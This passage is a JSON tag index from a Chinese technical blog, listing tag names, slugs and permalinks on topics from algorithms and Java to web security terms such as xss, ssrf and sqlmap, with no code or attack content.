9D%E6%83%B3/"},{"name":"深度优先搜索","slug":"深度优先搜索","permalink":"https://blog.cfyqy.com/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"},{"name":"广度优先搜索","slug":"广度优先搜索","permalink":"https://blog.cfyqy.com/tags/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"},{"name":"linux","slug":"linux","permalink":"https://blog.cfyqy.com/tags/linux/"},{"name":"磁盘分区","slug":"磁盘分区","permalink":"https://blog.cfyqy.com/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"},{"name":"数据检索","slug":"数据检索","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E6%A3%80%E7%B4%A2/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://blog.cfyqy.com/tags/elasticsearch/"},{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"排序算法","slug":"排序算法","permalink":"https://blog.cfyqy.com/tags/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"name":"java虚拟机","slug":"java虚拟机","permalink":"https://blog.cfyqy.com/tags/java%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"java IO","slug":"java-IO","permalink":"https://blog.cfyqy.com/tags/java-IO/"},{"name":"java并发","slug":"java并发","permalink":"https://blog.cfyqy.com/tags/java%E5%B9%B6%E5%8F%91/"},{"name":"剑指offer","slug":"剑指offer","permalink":"https://blog.cfyqy.com/tags/%E5%89%91%E6%8C%87offer/"},{"name":"java容器","slug":"java容器","permalink":"https://blog.cfyqy.com/tags/java%E5%AE%B9%E5%99%A8/"},{"name":"java基础","slug":"java基础","permalink":"https://blog.cfyqy.com/tags/java%E5%9F%BA%E7%A1%80/"},{"name":"django","slug":"django","permalink":"https://blog.cfyqy.com/tags/django/"},{"name":"线程","slug":"线程","permalink":"https://blog.cfyqy.com/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"进程","slug":"进程","permalink":"https://blog.cfyqy.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"协程","slug":"协程","permalink":"https://blog.cfyqy.com/tags/%E5%8D%8F%E7%A8%8B/"},{"name":"上下文管理器","slug":"上下文管理器","permalink":"https://blog.cfyqy.com/tags/%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E5%99%A8/"},{"name":"函数","slug":"函数","permalink":"https://blog.cfyqy.com/tags/%E5%87%BD%E6%95%B0/"},{"name":"元编程","slug":"元编程","permalink":"https://blog.cfyqy.com/tags/%E5%85%83%E7%BC%96%E7%A8%8B/"},{"name":"类","slug":"类","permalink":"https://blog.cfyqy.com/tags/%E7%B1%BB/"},{"name":"文件操作","slug":"文件操作","permalink":"https://blog.cfyqy.com/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"name":"编码","slug":"编码","permalink":"https://blog.cfyqy.com/tags/%E7%BC%96%E7%A0%81/"},{"name":"迭代器","slug":"迭代器","permalink":"https://blog.cfyqy.com/tags/%E8%BF%AD%E4%BB%A3%E5%99%A8/"},{"name":"生成器","slug":"生成器","permalink":"https://blog.cfyqy.com/tags/%E7%94%9F%E6%88%90%E5%99%A8/"},{"name":"常见数据类型","slug":"常见数据类型","permalink":"https://blog.cfyqy.com/tags/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"},{"name":"云计算","slug":"云计算","permalink":"https://blog.cfyqy.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"leetcode","slug":"leetcode","permalink":"https://blog.cfyqy.com/tags/leetcode/"},{"name":"nodejs","slug":"nodejs","permalink":"https://blog.cfyqy.com/tags/nodejs/"},{"name":"漏洞","slug":"漏洞","permalink":"https://blog.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"命令代码执行","slug":"命令代码执行","permalink":"https://blog.cfyqy.com/tags/%E5%91%BD%E4%BB%A4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"springboot","slug":"springboot","permalink":"https://blog.cfyqy.com/tags/springboot/"},{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/tags/%E5%85%B6%E4%BB%96/"},{"name":"maven","slug":"maven","permalink":"https://blog.cfyqy.com/tags/maven/"},{"name":"mybtis","slug":"mybtis","permalink":"https://blog.cfyqy.com/tags/mybtis/"},{"name":"spring mvc","slug":"spring-mvc","permalink":"https://blog.cfyqy.com/tags/spring-mvc/"},{"name":"spring","slug":"spring","permalink":"https://blog.cfyqy.com/tags/spring/"},{"name":"iot","slug":"iot","permalink":"https://blog.cfyqy.com/tags/iot/"},{"name":"java gui","slug":"java-gui","permalink":"https://blog.cfyqy.com/tags/java-gui/"},{"name":"docker","slug":"docker","permalink":"https://blog.cfyqy.com/tags/docker/"},{"name":"c++","slug":"c","permalink":"https://blog.cfyqy.com/tags/c/"},{"name":"c语言","slug":"c语言","permalink":"https://blog.cfyqy.com/tags/c%E8%AF%AD%E8%A8%80/"},{"name":"ctfd","slug":"ctfd","permalink":"https://blog.cfyqy.com/tags/ctfd/"},{"name":"flask","slug":"flask","permalink":"https://blog.cfyqy.com/tags/flask/"},{"name":"php","slug":"php","permalink":"https://blog.cfyqy.com/tags/php/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://blog.cfyqy.com/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"sqlmap","slug":"sqlmap","permalink":"https://blog.cfyqy.com/tags/sqlmap/"},{"name":"git","slug":"git","permalink":"https://blog.cfyqy.com/tags/git/"},{"name":"sqlserver","slug":"sqlserver","permalink":"https://blog.cfyqy.com/tags/sqlserver/"},{"name":"vim","slug":"vim","permalink":"https://blog.cfyqy.com/tags/vim/"},{"name":"ssrf","slug":"ssrf","permalink":"https://blog.cfyqy.com/tags/ssrf/"},{"name":"同源策略","slug":"同源策略","permalink":"https://blog.cfyqy.com/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"name":"xss","slug":"xss","permalink":"https://blog.cfyqy.com/tags/xss/"},{"name":"xxe","slug":"xxe","permalink":"https://blog.cfyqy.com/tags/xxe/"},{"name":"jsonp注入","slug":"jsonp注入","permalink":"https://blog.cfyqy.com/tags/jsonp%E6%B3%A8%E5%85%A5/"},{"name":"代码执行","slug":"代码执行","permalink":"https://blog.cfyqy.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"伪协议","slug":"伪协议","permalink":"https://blog.cfyqy.com/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"伪随机数","slug":"伪随机数","permalink":"https://blog.cfyqy.com/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"},{"name":"弱类型","slug":"弱类型","permalink":"https://blog.cfyqy.com/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"upload","slug":"upload","permalink":"https://blog.cfyqy.com/tags/upload/"},{"name":"shell","slug":"shell","permalink":"https://blog.cfyqy.com/tags/shell/"},{"name":"html5","slug":"html5","permalink":"https://blog.cfyqy.com/tags/html5/"},{"name":"css","slug":"css","permalink":"https://blog.cfyqy.com/tags/css/"},{"name":"jquery","slug":"jquery","permalink":"https://blog.cfyqy.com/tags/jquery/"},{"name":"window批处理","slug":"window批处理","permalink":"https://blog.cfyqy.com/tags/window%E6%89%B9%E5%A4%84%E7%90%86/"},{"name":"思维导图","slug":"思维导图","permalink":"https://blog.cfyqy.com/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"},{"name":"java web","slug":"java-web","permalink":"https://blog.cfyqy.com/tags/java-web/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://blog.cfyqy.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"网络协议","slug":"网络协议","permalink":"https://blog.cfyqy.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"oracle","slug":"oracle","permalink":"https://blog.cfyqy.com/tags/oracle/"},{"name":"操作系统","slug":"操作系统","permalink":"https://blog.cfyqy.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"随笔","slug":"随笔","permalink":"https://blog.cfyqy.com/tags/%E9%9A%8F%E7%AC%94/"},{"name":"爬虫","slug":"爬虫","permalink":"https://blog.cfyqy.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"搜索引擎","slug":"搜索引擎","permalink":"https://blog.cfyqy.com/tags/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"}]}